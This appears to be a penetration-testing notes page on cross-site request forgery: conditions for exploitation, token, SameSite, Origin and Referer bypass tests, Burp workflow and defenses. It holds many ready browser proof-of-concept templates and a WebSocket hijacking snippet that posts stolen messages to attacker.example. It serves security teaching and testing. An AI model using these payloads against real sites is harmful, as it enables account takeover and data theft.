# Cross-Site Request Forgery — CSRF

## Introduction

Cross-Site Request Forgery, usually shortened to **CSRF** or **XSRF**, is a web vulnerability where an attacker tricks a victim’s browser into sending an unintended request to an application where the victim is already authenticated.

The key idea:

```text
Victim is logged in  →  attacker-controlled page triggers request  →  target app trusts victim's browser
```

The attacker usually cannot read the response because of the browser’s same-origin policy, but they often do not need to read it. The goal is to make the victim perform a **state-changing action**.

CSRF can lead to:

* changing the victim’s email address
* changing account settings
* changing password if the old password is not required
* adding attacker-controlled MFA methods
* disabling security options
* creating API keys
* adding users
* changing roles or permissions
* submitting forms
* transferring funds
* deleting data
* changing notification/webhook destinations
* forcing login to an attacker-controlled account
* abusing admin-only functionality if the victim is an administrator


---

## Useful Resources

* [Incendium CSRF Notes](https://notes.incendium.rocks/pentesting-notes/web/csrf)
* [HackTricks CSRF](https://hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery.html)
* [PortSwigger CSRF](https://portswigger.net/web-security/csrf)
* [PortSwigger Bypassing CSRF Token Validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [PortSwigger Bypassing SameSite Cookie Restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)
* [PortSwigger Bypassing Referer-Based CSRF Defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [PortSwigger Preventing CSRF](https://portswigger.net/web-security/csrf/preventing)
* [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
* [OWASP CSRF Attack Page](https://owasp.org/www-community/attacks/csrf)
* [MDN CSRF](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF)
* [PayloadsAllTheThings CSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)

---

## Basics

CSRF testing is about answering six questions:

1. **Is there a state-changing action?**
   Example: change email, change password, add user, delete item, create API token, update billing details.

2. **Does the application rely on browser-sent credentials?**
   Example: session cookie, Basic Auth, NTLM, client certificate, automatically attached SSO cookie.

3. **Can the attacker predict all required parameters?**
   If the request needs only predictable values, CSRF is more likely. If it needs a strong per-user CSRF token, old password, OTP, or reauthentication, exploitation is harder.

4. **Is there a CSRF token or similar anti-CSRF control?**
   Check whether it exists, whether it is required, whether it is tied to the user session, and whether it is validated consistently.

5. **Can the request be sent cross-site by a browser?**
   HTML forms, image tags, script tags, links, iframes, and top-level navigations behave differently.

6. **Do browser cookie rules allow the session cookie to be sent?**
   Check `SameSite`, request method, top-level navigation, scheme, subdomains, and sibling-domain attack surface.

A vulnerable flow often looks like this:

```text
Victim is logged in to:
    https://bank.example

Sensitive request:
    POST /transfer
    recipient=attacker&amount=1000

Attacker hosts:
    https://evil.example/csrf.html

Victim visits attacker page:
    browser automatically sends bank.example cookies

Target receives:
    authenticated transfer request from victim's browser
```

The target application sees a valid authenticated request, but the victim did not intend to make it.

---

## CSRF vs XSS

| Vulnerability | Trust abused                                    | Main capability                                             |
| ------------- | ----------------------------------------------- | ----------------------------------------------------------- |
| CSRF          | Website trusts the victim’s browser/session.    | Make the victim perform an action.                          |
| XSS           | Victim’s browser trusts the vulnerable website. | Run attacker-controlled JavaScript in the victim’s browser. |

Important difference:

```text
CSRF usually cannot read the response.
XSS usually can read and manipulate the page.
```

However, XSS can often bypass CSRF protections because JavaScript running on the target origin may read CSRF tokens and submit valid requests.

---

## Main CSRF Requirements

For classic CSRF, these conditions usually need to exist:

| Requirement               | Meaning                                                                                                        |
| ------------------------- | -------------------------------------------------------------------------------------------------------------- |
| Relevant action           | There is something useful to force the victim to do.                                                           |
| Cookie/session-based auth | The browser automatically attaches credentials.                                                                |
| Predictable request       | The attacker can guess or control all required parameters.                                                     |
| No effective CSRF defense | Missing token, broken token validation, weak Origin/Referer check, weak SameSite setup, or bypassable defense. |

Example of a risky request:

```http
POST /account/change-email HTTP/1.1
Host: vulnerable.example
Content-Type: application/x-www-form-urlencoded
Cookie: session=VICTIM_SESSION

email=attacker@example.com
```

Why risky?

```text
state-changing action: yes
browser sends cookie automatically: yes
parameters predictable: yes
CSRF token: missing
```

---

## Common CSRF Targets

| Functionality               | Possible impact                                          |
| --------------------------- | -------------------------------------------------------- |
| Change email                | Account takeover through password reset.                 |
| Change password             | Direct account takeover if old password is not required. |
| Add MFA device              | Persistent account takeover.                             |
| Disable MFA                 | Weakens account security.                                |
| Change recovery email/phone | Account recovery takeover.                               |
| Create API key/token        | Long-term unauthorized access.                           |
| Delete API key/token        | Denial of service.                                       |
| Add user                    | Privilege expansion.                                     |
| Change user role            | Privilege escalation.                                    |
| Invite user                 | Access expansion.                                        |
| Change billing details      | Fraud or data exposure.                                  |
| Transfer funds              | Financial loss.                                          |
| Change webhook URL          | Data exfiltration.                                       |
| Change notification email   | Sensitive data redirection.                              |
| Update SSO/OAuth settings   | Authentication compromise.                               |
| Delete object               | Data loss.                                               |
| Publish/unpublish content   | Integrity impact.                                        |
| Change privacy setting      | Data exposure.                                           |
| Logout                      | Low impact, but sometimes useful in chains.              |
| Login CSRF                  | Force victim into attacker-controlled account.           |

High-value admin actions:

```text
create user
delete user
reset password
change role
add admin
generate API key
change SAML configuration
change OAuth redirect URI
change webhook
change email template
disable audit logging
disable MFA policy
change firewall/IP allowlist
change payment details
```

---

## Where to Test

Test every endpoint that changes server-side state.

| Location              | Examples                                       |
| --------------------- | ---------------------------------------------- |
| HTML forms            | profile update, password change, admin actions |
| JSON APIs             | account settings, billing, API keys            |
| GraphQL mutations     | `mutation { updateEmail(...) }`                |
| REST APIs             | `POST`, `PUT`, `PATCH`, `DELETE`               |
| GET endpoints         | dangerous if they change state                 |
| Multipart forms       | avatar, import, upload settings                |
| Admin panels          | user management, roles, integrations           |
| Webhooks              | destination URL, secret, event subscriptions   |
| OAuth/OIDC/SAML flows | login CSRF, account linking, IdP settings      |
| Email links           | one-click confirmation links                   |
| Mobile webviews       | authenticated actions inside embedded browsers |
| WebSocket handshake   | cross-site WebSocket hijacking                 |
| CORS-enabled APIs     | credentialed cross-origin requests             |
| Same-site subdomains  | sibling-domain gadgets bypassing SameSite      |

Interesting parameter names:

```text
email
newEmail
password
newPassword
role
admin
isAdmin
mfa
totp
phone
recovery
apiKey
token
webhook
callback
redirect
amount
recipient
userId
groupId
teamId
orgId
permission
scope
delete
confirm
active
enabled
verified
```

Interesting routes:

```text
/account
/profile
/settings
/user/update
/users/create
/admin
/admin/users
/password/change
/email/change
/mfa/disable
/api-keys/create
/webhooks/update
/billing/update
/transfer
/delete
/graphql
/oauth/authorize
/saml/config
```

---

## Safe Testing Workflow

1. Confirm scope and authorization.
2. Log in with a low-privileged test account.
3. Capture a normal state-changing request in Burp.
4. Send the request to Repeater.
5. Identify:

   * method
   * path
   * cookies
   * content type
   * body parameters
   * CSRF token
   * Origin header
   * Referer header
   * SameSite cookie behavior
6. Remove or modify anti-CSRF controls one at a time.
7. Replay the request.
8. If it still works, build a browser-based proof of concept.
9. Test from a separate browser profile or private window.
10. Do not test destructive actions on production unless explicitly allowed.

Good low-impact test actions:

```text
change display name
change bio
change UI theme
change notification preference
change timezone
change harmless profile field
create test-only object
delete test-only object
```

Avoid as first proof:

```text
delete real users
transfer money
disable MFA on real accounts
change admin roles
create persistent access
generate real production API keys
modify payment details
```

---

## Basic GET CSRF

A GET endpoint is vulnerable if it changes state.

Vulnerable request:

```http
GET /account/change-email?email=attacker@example.com HTTP/1.1
Host: vulnerable.example
Cookie: session=VICTIM_SESSION
```

Simple exploit with image tag:

```html
<img src="https://vulnerable.example/account/change-email?email=attacker@example.com">
```

Simple exploit with link:

```html
<a href="https://vulnerable.example/account/change-email?email=attacker@example.com">
  Click me
</a>
```

Top-level navigation:

```html
<script>
  document.location = "https://vulnerable.example/account/change-email?email=attacker@example.com";
</script>
```

Meta refresh:

```html
<meta http-equiv="refresh" content="0; url=https://vulnerable.example/account/change-email?email=attacker@example.com">
```

GET-based CSRF is especially dangerous when:

```text
state changes happen through GET
SameSite=Lax allows top-level GET navigation
no CSRF token is required
the endpoint accepts method override
the target action is admin-only
```

---

## Basic POST CSRF

Vulnerable request:

```http
POST /account/change-email HTTP/1.1
Host: vulnerable.example
Content-Type: application/x-www-form-urlencoded
Cookie: session=VICTIM_SESSION

email=attacker@example.com
```

Auto-submitting form:

```html
<html>
  <body>
    <form action="https://vulnerable.example/account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@example.com">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Button-based proof:

```html
<html>
  <body>
    <form action="https://vulnerable.example/account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@example.com">
      <button type="submit">Click here</button>
    </form>
  </body>
</html>
```

Use a button-based proof if you want a safer demonstration that does not immediately trigger when opened.

---

## Multipart Form CSRF

Some endpoints accept `multipart/form-data`.

Example:

```html
<html>
  <body>
    <form action="https://vulnerable.example/profile/update" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="displayName" value="csrf-test">
      <input type="hidden" name="bio" value="changed-by-csrf-poc">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Useful when the original request uses file upload or multipart encoding.

---

## text/plain CSRF

HTML forms can send `text/plain`.

Example:

```html
<html>
  <body>
    <form action="https://vulnerable.example/api/profile" method="POST" enctype="text/plain">
      <input type="hidden" name='{"displayName":"csrf-test","ignore":"' value='"}'>
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Resulting body shape may look similar to JSON:

```json
{"displayName":"csrf-test","ignore":"="}
```

This can work when a server accepts malformed JSON, ignores trailing characters, or performs loose body parsing.

---

## JSON CSRF

Many modern apps assume JSON APIs are automatically safe from CSRF. That is not always true.

A normal HTML form cannot set:

```http
Content-Type: application/json
```

But JSON CSRF may still be possible if:

```text
the server accepts text/plain as JSON
the server accepts application/x-www-form-urlencoded as JSON
the server ignores Content-Type
the endpoint supports method override
CORS is misconfigured with credentials
the app uses cookies for API authentication
the API accepts simple requests
```

Test content-type confusion:

```http
POST /api/profile HTTP/1.1
Host: vulnerable.example
Content-Type: text/plain
Cookie: session=VICTIM_SESSION

{"displayName":"csrf-test"}
```

Test form-urlencoded confusion:

```http
POST /api/profile HTTP/1.1
Host: vulnerable.example
Content-Type: application/x-www-form-urlencoded
Cookie: session=VICTIM_SESSION

displayName=csrf-test
```

Test JSON endpoint with missing or modified content type:

```http
POST /api/profile HTTP/1.1
Host: vulnerable.example
Cookie: session=VICTIM_SESSION

{"displayName":"csrf-test"}
```

If the server accepts any of these, a browser-based CSRF may be possible.

---

## GraphQL CSRF

GraphQL mutations are state-changing and must be checked.

Typical GraphQL mutation:

```http
POST /graphql HTTP/1.1
Host: vulnerable.example
Content-Type: application/json
Cookie: session=VICTIM_SESSION

{
  "query": "mutation { updateEmail(email: \"attacker@example.com\") { id } }"
}
```

Check whether the GraphQL endpoint also accepts:

```text
application/x-www-form-urlencoded
multipart/form-data
text/plain
GET query parameter
```

GET-based GraphQL mutation test:

```http
GET /graphql?query=mutation%20%7B%20updateEmail(email%3A%20%22attacker%40example.com%22)%20%7B%20id%20%7D%20%7D HTTP/1.1
Host: vulnerable.example
Cookie: session=VICTIM_SESSION
```

Form-based GraphQL test:

```html
<html>
  <body>
    <form action="https://vulnerable.example/graphql" method="POST">
      <input type="hidden" name="query" value='mutation { updateEmail(email: "attacker@example.com") { id } }'>
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

GraphQL is not immune to CSRF if it uses cookie-based authentication and accepts browser-sendable request formats.

---

## Login CSRF

Login CSRF forces the victim to log in as the attacker.

Example:

```text
1. Attacker creates an account.
2. Attacker crafts a CSRF login request using attacker credentials.
3. Victim visits attacker page.
4. Victim becomes logged in as attacker.
5. Victim adds personal data, payment method, or performs actions inside attacker-controlled account.
```

Example PoC:

```html
<html>
  <body>
    <form action="https://vulnerable.example/login" method="POST">
      <input type="hidden" name="username" value="attacker@example.com">
      <input type="hidden" name="password" value="attacker-password">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Impact examples:

```text
victim saves payment method into attacker account
victim uploads private documents into attacker account
victim links OAuth identity to attacker account
victim performs purchases under attacker account
victim exposes search/history/profile data
```

Login CSRF is often underestimated because it does not directly take over the victim’s original account. It can still be high impact in account-linking, payment, healthcare, marketplace, and SaaS applications.

---

## Logout CSRF

Logout CSRF forces the victim to log out.

Example:

```html
<img src="https://vulnerable.example/logout">
```

Usually low severity, but it can be useful in chains:

```text
logout victim
force login CSRF
force OAuth flow
force account linking
cause denial of service
```

---

## Account-Linking CSRF

Account linking is a common high-impact target.

Example:

```text
1. Victim is logged in to target app.
2. Attacker starts OAuth linking flow with attacker-controlled provider account.
3. Victim is forced to complete/link the attacker's OAuth identity.
4. Attacker can later log in to victim's account through the linked provider.
```

Check endpoints like:

```text
/connect/google
/connect/github
/oauth/link
/account/link
/social/connect
/sso/link
```

Red flags:

```text
missing state parameter
state not tied to user session
state reusable
state predictable
state accepted from attacker session
callback does not verify original user intent
```

---

## OAuth / OIDC CSRF

OAuth and OIDC flows should use a strong `state` value tied to the user session.

Risky authorization request:

```text
https://idp.example/authorize?
  client_id=client123&
  redirect_uri=https://app.example/callback&
  response_type=code&
  scope=openid%20profile
```

Safer authorization request:

```text
https://idp.example/authorize?
  client_id=client123&
  redirect_uri=https://app.example/callback&
  response_type=code&
  scope=openid%20profile&
  state=random-session-bound-value&
  nonce=random-oidc-value
```

Test:

```text
remove state
reuse old state
use state from attacker account
use state from another browser
use state after logout/login
use same state twice
tamper with redirect_uri
check account linking flow separately
```

Possible impact:

```text
login CSRF
account linking takeover
authorization code injection
victim account linked to attacker identity
confused deputy between IdP and RP
```

---

## Cross-Site WebSocket Hijacking — CSWSH

Cross-Site WebSocket Hijacking is similar to CSRF but targets the WebSocket handshake.

Risk condition:

```text
WebSocket uses cookie-based authentication
Origin header is not validated
sensitive actions are possible over the socket
```

Example browser PoC shape:

```html
<script>
  const ws = new WebSocket("wss://vulnerable.example/socket");

  ws.onopen = () => {
    ws.send(JSON.stringify({
      action: "changeEmail",
      email: "attacker@example.com"
    }));
  };

  ws.onmessage = (event) => {
    fetch("https://attacker.example/log", {
      method: "POST",
      mode: "no-cors",
      body: event.data
    });
  };
</script>
```

Unlike classic CSRF, WebSocket hijacking may allow reading messages if the attacker’s page establishes the socket and receives data.

Check:

```text
does the WebSocket handshake include victim cookies?
does the server validate Origin?
can sensitive actions be sent over WebSocket?
does the server send sensitive data after connection?
```

---

## SameSite Cookie Behavior

`SameSite` controls when browsers include cookies in cross-site requests.

| Setting                 | Behavior                                                                                               |
| ----------------------- | ------------------------------------------------------------------------------------------------------ |
| `SameSite=Strict`       | Cookie is not sent on cross-site requests. Strongest, but can affect usability.                        |
| `SameSite=Lax`          | Cookie is sent on top-level cross-site navigations using safe methods such as GET.                     |
| `SameSite=None; Secure` | Cookie is sent in cross-site contexts, but must be Secure.                                             |
| Missing SameSite        | Modern browsers often apply Lax-like behavior by default, but do not rely on this as the only defense. |

Important distinction:

```text
same-origin = scheme + host + port
same-site   = scheme + registrable domain
```

Example:

| From                      | To                          | Same-site? | Same-origin? |
| ------------------------- | --------------------------- | ---------- | ------------ |
| `https://example.com`     | `https://example.com`       | Yes        | Yes          |
| `https://app.example.com` | `https://admin.example.com` | Yes        | No           |
| `https://example.com`     | `https://example.com:8443`  | Yes        | No           |
| `http://example.com`      | `https://example.com`       | Usually No | No           |
| `https://example.com`     | `https://evil.com`          | No         | No           |

This matters because a vulnerable sibling subdomain can sometimes bypass site-based protections.

---

## SameSite Bypass Ideas

### Lax + GET

If the action can be performed with GET and the cookie is `SameSite=Lax`, a top-level navigation may include the victim’s cookie.

```html
<script>
  document.location = "https://vulnerable.example/account/change-email?email=attacker@example.com";
</script>
```

### Method Override

Some frameworks allow method override:

```text
_method=POST
X-HTTP-Method-Override: POST
X-Method-Override: PATCH
```

Form example:

```html
<html>
  <body>
    <form action="https://vulnerable.example/account/change-email" method="GET">
      <input type="hidden" name="_method" value="POST">
      <input type="hidden" name="email" value="attacker@example.com">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### On-site Gadget

A same-site gadget can turn a cross-site navigation into a same-site request.

Example flow:

```text
evil.example
  → https://vulnerable.example/redirect?next=/account/change-email?email=attacker@example.com
  → same-site request to sensitive endpoint
```

Common gadgets:

```text
client-side redirect
open redirect
HTML injection on sibling subdomain
XSS on sibling subdomain
file upload served from same site
CORS gadget
dangling markup
postMessage gadget
```

### Vulnerable Sibling Domain

If `blog.example.com` has XSS and `admin.example.com` relies only on SameSite, the attack may become same-site.

```text
https://blog.example.com/xss
    can send same-site request to
https://admin.example.com/settings
```

SameSite is helpful, but it is not a replacement for strong CSRF tokens on sensitive actions.

---

## CSRF Token Bypass Testing

A CSRF token should be:

```text
unpredictable
high entropy
server-generated
tied to the user's session
validated for every state-changing request
invalidated appropriately
not leaked in URLs/logs/Referer
```

Common mistakes:

| Weakness                             | Test                                               |
| ------------------------------------ | -------------------------------------------------- |
| Token missing                        | Remove token parameter completely.                 |
| Empty token accepted                 | Set token value to empty string.                   |
| Token value ignored                  | Change token to random value.                      |
| Method-specific validation           | Change POST to GET.                                |
| Content-Type-specific validation     | Change JSON to form-urlencoded or text/plain.      |
| Token not tied to session            | Use token from attacker account in victim request. |
| Token not tied to user               | Reuse token between accounts.                      |
| Token duplicated in cookie           | Set matching cookie and body parameter.            |
| Token in non-session cookie          | Try cookie injection from sibling subdomain.       |
| Static token                         | Reuse same token after logout/login.               |
| Predictable token                    | Compare multiple tokens for pattern.               |
| Token only checked on some endpoints | Test similar endpoints and API versions.           |
| Token only checked when present      | Remove entire parameter, not just value.           |
| Token checked with weak comparison   | Try truncation or type confusion in JSON contexts. |

---

## Token Removal Tests

Original request:

```http
POST /account/change-email HTTP/1.1
Host: vulnerable.example
Content-Type: application/x-www-form-urlencoded
Cookie: session=VICTIM_SESSION

email=user@example.com&csrf=VALID_TOKEN
```

Remove token value:

```http
POST /account/change-email HTTP/1.1
Host: vulnerable.example
Content-Type: application/x-www-form-urlencoded
Cookie: session=VICTIM_SESSION

email=attacker@example.com&csrf=
```

Remove token parameter entirely:

```http
POST /account/change-email HTTP/1.1
Host: vulnerable.example
Content-Type: application/x-www-form-urlencoded
Cookie: session=VICTIM_SESSION

email=attacker@example.com
```

Random token:

```http
POST /account/change-email HTTP/1.1
Host: vulnerable.example
Content-Type: application/x-www-form-urlencoded
Cookie: session=VICTIM_SESSION

email=attacker@example.com&csrf=random
```

Duplicate token parameter:

```http
POST /account/change-email HTTP/1.1
Host: vulnerable.example
Content-Type: application/x-www-form-urlencoded
Cookie: session=VICTIM_SESSION

email=attacker@example.com&csrf=random&csrf=VALID_TOKEN
```

or:

```http
POST /account/change-email HTTP/1.1
Host: vulnerable.example
Content-Type: application/x-www-form-urlencoded
Cookie: session=VICTIM_SESSION

email=attacker@example.com&csrf=VALID_TOKEN&csrf=random
```

Check whether the backend uses first value, last value, array value, or ignores duplicates.

---

## Token Not Bound to Session

Test with two accounts.

```text
1. Log in as attacker in Browser A.
2. Capture valid CSRF token from attacker session.
3. Log in as victim/test user in Browser B.
4. Submit victim request using attacker token.
5. If accepted, token is not bound to victim session.
```

Example:

```http
POST /account/change-email HTTP/1.1
Host: vulnerable.example
Content-Type: application/x-www-form-urlencoded
Cookie: session=VICTIM_SESSION

email=attacker@example.com&csrf=ATTACKER_TOKEN
```

If this works, a real attacker can obtain their own valid token and use it in a CSRF payload against another user.

---

## Token Duplicated in Cookie

Some apps use:

```http
Cookie: session=VICTIM_SESSION; csrf=TOKEN123

csrf=TOKEN123&email=attacker@example.com
```

If the server only checks whether the cookie token equals the body token, this may be vulnerable if the attacker can set the cookie.

Potential cookie injection sources:

```text
sibling subdomain
HTTP response splitting
open redirect that sets cookies
subdomain takeover
XSS on sibling domain
CNAME to third-party service
insecure Domain=.example.com cookie scope
```

Attack shape:

```text
1. attacker sets csrf=attacker-chosen-token in victim browser
2. attacker submits form with csrf=attacker-chosen-token
3. server sees matching cookie/body token
4. action succeeds
```

---

## Method Bypass

Some apps validate CSRF only on POST.

Original:

```http
POST /account/change-email HTTP/1.1
Host: vulnerable.example
Content-Type: application/x-www-form-urlencoded

email=user@example.com&csrf=VALID_TOKEN
```

Try GET:

```http
GET /account/change-email?email=attacker@example.com HTTP/1.1
Host: vulnerable.example
Cookie: session=VICTIM_SESSION
```

Try method override:

```http
POST /account/change-email HTTP/1.1
Host: vulnerable.example
Content-Type: application/x-www-form-urlencoded

_method=GET&email=attacker@example.com
```

Try GET with override to POST:

```http
GET /account/change-email?_method=POST&email=attacker@example.com HTTP/1.1
Host: vulnerable.example
Cookie: session=VICTIM_SESSION
```

---

## Content-Type Bypass

Some apps validate CSRF only for one content type.

Try:

```text
application/x-www-form-urlencoded
multipart/form-data
text/plain
application/json
application/xml
```

Examples:

```http
POST /api/profile HTTP/1.1
Host: vulnerable.example
Content-Type: application/x-www-form-urlencoded
Cookie: session=VICTIM_SESSION

displayName=csrf-test
```

```http
POST /api/profile HTTP/1.1
Host: vulnerable.example
Content-Type: text/plain
Cookie: session=VICTIM_SESSION

{"displayName":"csrf-test"}
```

```http
POST /api/profile HTTP/1.1
Host: vulnerable.example
Content-Type: multipart/form-data; boundary=----boundary
Cookie: session=VICTIM_SESSION

------boundary
Content-Disposition: form-data; name="displayName"

csrf-test
------boundary--
```

---

## Origin Header Checks

Modern browsers often send an `Origin` header on CORS and many state-changing requests.

Example:

```http
Origin: https://evil.example
```

Good server behavior:

```text
reject if Origin is cross-site
reject if Origin is missing on sensitive requests unless there is a safe fallback
compare exact scheme + host + port
do not use substring matching
```

Bad checks:

```text
Origin contains example.com
Origin starts with https://example.com
Origin ends with example.com
missing Origin accepted without fallback
null Origin accepted
```

Test cases:

```http
Origin: https://evil.example
Origin: https://example.com.evil.example
Origin: https://evil.example?example.com
Origin: null
Origin:
```

Note:

```text
Origin is generally better than Referer for CSRF validation, but it still needs strict exact matching and safe handling of missing/null values.
```

---

## Referer Header Checks

Some applications use `Referer` as CSRF protection.

Example:

```http
Referer: https://vulnerable.example/account/settings
```

Common weaknesses:

```text
Referer checked only if present
missing Referer accepted
substring matching
starts-with matching
ends-with matching
query string trick
subdomain trick
Referrer-Policy manipulation
```

Suppress Referer:

```html
<meta name="referrer" content="no-referrer">
```

Older form:

```html
<meta name="referrer" content="never">
```

Naive starts-with bypass:

```text
https://vulnerable.example.attacker.example/csrf
```

Naive contains bypass:

```text
https://attacker.example/csrf?vulnerable.example
```

Unsafe referrer policy to preserve full URL:

```http
Referrer-Policy: unsafe-url
```

A secure check should parse the header and compare the exact origin, not use substring matching.

---

## Fetch Metadata Headers

Browsers may send Fetch Metadata headers such as:

```text
Sec-Fetch-Site
Sec-Fetch-Mode
Sec-Fetch-Dest
Sec-Fetch-User
```

Useful values:

```text
Sec-Fetch-Site: same-origin
Sec-Fetch-Site: same-site
Sec-Fetch-Site: cross-site
Sec-Fetch-Site: none
```

Defensive idea:

```text
block state-changing requests when Sec-Fetch-Site is cross-site
allow same-origin
carefully decide same-site policy
handle missing headers for old browsers
```

Example policy concept:

```text
if method is POST/PUT/PATCH/DELETE:
    allow if Sec-Fetch-Site is same-origin
    optionally allow same-site
    reject cross-site
```

Fetch Metadata is useful defense-in-depth, especially for modern browsers, but should not replace robust CSRF tokens for sensitive form-based actions.

---

## CORS and CSRF

CORS and CSRF are related, but they are not the same.

Important distinction:

```text
CSRF = can attacker send the request?
CORS = can attacker read the response?
```

A CSRF attack often does not need to read the response.

CORS can make CSRF worse when:

```text
Access-Control-Allow-Origin reflects attacker origin
Access-Control-Allow-Credentials: true
API uses cookie-based authentication
state-changing endpoint allows cross-origin requests
custom headers are allowed
preflight is accepted from attacker origin
```

Dangerous response headers:

```http
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true
```

If this exists, the issue may become both:

```text
CSRF
+
cross-origin response read / data theft
```

---

## Simple vs Non-Simple Requests

Browsers can send simple cross-origin requests without a CORS preflight.

Simple methods:

```text
GET
HEAD
POST
```

Simple content types:

```text
application/x-www-form-urlencoded
multipart/form-data
text/plain
```

Not simple:

```text
application/json
custom headers
PUT
PATCH
DELETE
Authorization header
```

Why this matters:

```text
HTML forms can send simple requests cross-site.
JavaScript requests with custom headers usually need CORS preflight.
```

Defense idea for API-style apps:

```text
require Content-Type: application/json
require custom anti-CSRF header
reject simple content types for state-changing API endpoints
do not allow credentialed CORS from untrusted origins
```

Example custom header:

```http
X-CSRF-Protection: 1
```

A normal HTML form cannot add this header cross-site.

---

## Cookie Settings

Review session cookies:

```http
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Lax
```

Important attributes:

| Attribute               | CSRF relevance                                                              |
| ----------------------- | --------------------------------------------------------------------------- |
| `SameSite=Strict`       | Strong CSRF protection, but may affect UX.                                  |
| `SameSite=Lax`          | Helps against cross-site POST, but top-level GET may still include cookies. |
| `SameSite=None; Secure` | Cookie sent cross-site; risky for session cookies unless required.          |
| `Secure`                | Sends cookie only over HTTPS.                                               |
| `HttpOnly`              | Protects against JavaScript reading cookie, but does not prevent CSRF.      |
| `Domain=.example.com`   | Cookie shared with subdomains; risky if sibling domains are weak.           |

Important:

```text
HttpOnly does not prevent CSRF.
Secure does not prevent CSRF.
SameSite helps but should not be the only defense for sensitive actions.
```

---

## Browser-Based PoC Templates

### Auto-submit POST form

```html
<html>
  <body>
    <form action="https://vulnerable.example/account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@example.com">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### GET image tag

```html
<img src="https://vulnerable.example/account/change-email?email=attacker@example.com">
```

### Top-level GET navigation

```html
<script>
  window.location = "https://vulnerable.example/account/change-email?email=attacker@example.com";
</script>
```

### Iframe-based form

```html
<html>
  <body>
    <iframe name="hiddenFrame" style="display:none"></iframe>

    <form action="https://vulnerable.example/profile/update" method="POST" target="hiddenFrame">
      <input type="hidden" name="displayName" value="csrf-test">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Multi-step CSRF

```html
<html>
  <body>
    <iframe name="step1" style="display:none"></iframe>
    <iframe name="step2" style="display:none"></iframe>

    <form id="f1" action="https://vulnerable.example/settings/step1" method="POST" target="step1">
      <input type="hidden" name="option" value="enabled">
    </form>

    <form id="f2" action="https://vulnerable.example/settings/step2" method="POST" target="step2">
      <input type="hidden" name="confirm" value="true">
    </form>

    <script>
      document.getElementById("f1").submit();
      setTimeout(() => {
        document.getElementById("f2").submit();
      }, 1500);
    </script>
  </body>
</html>
```

### Form with Referer suppression

```html
<html>
  <head>
    <meta name="referrer" content="no-referrer">
  </head>
  <body>
    <form action="https://vulnerable.example/account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@example.com">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Method override

```html
<html>
  <body>
    <form action="https://vulnerable.example/account/change-email" method="GET">
      <input type="hidden" name="_method" value="POST">
      <input type="hidden" name="email" value="attacker@example.com">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### text/plain body

```html
<html>
  <body>
    <form action="https://vulnerable.example/api/profile" method="POST" enctype="text/plain">
      <input type="hidden" name='{"displayName":"csrf-test","x":"' value='"}'>
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

## Burp Suite Workflow

### Manual

1. Capture the sensitive request.
2. Right-click → Engagement tools → Generate CSRF PoC.
3. Review generated HTML.
4. Remove unnecessary fields.
5. Replace destructive values with harmless test values.
6. Host locally or in Burp’s exploit server in labs.
7. Open in a second browser where the victim/test user is logged in.
8. Confirm whether the action happened.

### Repeater Tests

Test these variants:

```text
remove CSRF token
empty CSRF token
random CSRF token
reuse old CSRF token
reuse token from another account
duplicate token parameter
change POST to GET
change JSON to form-urlencoded
change JSON to text/plain
remove Origin
change Origin
remove Referer
change Referer
remove custom header
remove X-Requested-With
```

### Match/Compare

Compare:

```text
status code
response body
redirect location
error message
state change in UI
audit logs
email notifications
object history
```

Do not rely only on HTTP `200 OK`. Confirm the state actually changed.

---

## Common False Positives

Not every missing CSRF token is exploitable.

| Situation                                          | Why it may not be exploitable                     |
| -------------------------------------------------- | ------------------------------------------------- |
| Bearer token in Authorization header               | Browser will not add it automatically cross-site. |
| Custom header required                             | HTML forms cannot add arbitrary custom headers.   |
| `Content-Type: application/json` strictly required | HTML forms cannot send true JSON content type.    |
| Strong SameSite=Strict and no same-site gadget     | Session cookie may not be sent.                   |
| Old password required                              | Attacker cannot predict it.                       |
| Reauthentication required                          | Victim must intentionally verify.                 |
| OTP/passkey required                               | Strong user interaction barrier.                  |
| CSRF token tied to session                         | Attacker cannot supply valid victim token.        |
| CORS preflight denied                              | JS cannot send required non-simple request.       |
| Endpoint does not change state                     | Low/no impact.                                    |

Still check for bypasses before closing the issue.

---

## Common Impact Chains

CSRF often becomes more serious when chained.

```text
CSRF → change email → password reset → account takeover
CSRF → add MFA method → persistent account takeover
CSRF → create API key → long-term API access
CSRF → add admin user → full application compromise
CSRF → change webhook → sensitive data exfiltration
CSRF → change OAuth link → account takeover
CSRF → login CSRF → victim stores data in attacker account
CSRF → disable notification → hide malicious activity
CSRF → change SSO config → organization-wide auth compromise
CSRF → admin victim → full application compromise
CSRF + XSS on sibling domain → SameSite bypass
CSRF + CORS misconfig → perform action and read response
CSRF + clickjacking → force user interaction
```

---



## Manual CSRF Checklist

### Discovery

* [ ] Identified all state-changing endpoints.
* [ ] Checked forms, REST APIs, GraphQL mutations, admin actions, OAuth/OIDC flows, and WebSockets.
